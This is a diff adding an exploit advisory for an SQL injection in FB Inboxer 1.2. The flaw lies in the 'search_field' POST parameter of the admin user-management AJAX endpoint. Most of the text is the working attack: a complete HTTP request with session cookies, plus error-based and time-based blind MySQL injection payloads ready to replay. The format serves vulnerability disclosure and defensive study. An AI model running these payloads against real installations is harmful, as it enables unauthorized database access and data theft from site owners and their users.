@@ -1,0 +1,55 @@
+# Exploit Title: FB Inboxer 1.2 - 'search_field' SQL Injection
+# Google Dork: N/A
+# Date: 02.08.2018
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor Homepage: https://codecanyon.net/item/pageresponse-a-fb-inboxer-addon-facebook-auto-commentprivate-reply-likeshare-for-full-page/21486371
+# Version: 1.2
+# Tested on: Kali linux
+====================================================
+Description : The vulnerability allows an attacker to inject sql commands
+from the search section with 'search_field' parameter in the management
+panel.
+
+# Demo : http://server/home/login
+# PoC : SQLi :
+
+http://server/admin/user_management/ajax_list_info
+
+POST /admin/user_management/ajax_list_info HTTP/1.1
+Host: server
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
+Firefox/52.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://server/admin/user_management
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 91
+Cookie: ci_session=8v3965595vs5h1gcufa8kmkl8uti8ccr;
+crud_page_c2dc7c9e0776f8cb12c51196de4108be=2;
+per_page_c2dc7c9e0776f8cb12c51196de4108be=15;
+hidden_ordering_c2dc7c9e0776f8cb12c51196de4108be=asc;
+hidden_sorting_c2dc7c9e0776f8cb12c51196de4108be=id;
+search_text_c2dc7c9e0776f8cb12c51196de4108be=tes;
+search_field_c2dc7c9e0776f8cb12c51196de4108be=name
+Connection: keep-alive
+search_text=tes&search_field=name&per_page=15&order_by%5B0%5D=id&order_by%5B1%5D=asc&page=1
+
+
+Parameter: search_field (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP
+BY clause (FLOOR)
+    Payload: search_text=tes&search_field=name AND (SELECT 4580 FROM(SELECT
+COUNT(*),CONCAT(0x71716a7671,(SELECT
+(ELT(4580=4580,1))),0x7170717671,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY
+x)a)&per_page=15&order_by[0]=id&order_by[1]=asc&page=1
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: search_text=tes&search_field=name AND
+SLEEP(5)&per_page=15&order_by[0]=id&order_by[1]=asc&page=1
+
+====================================================
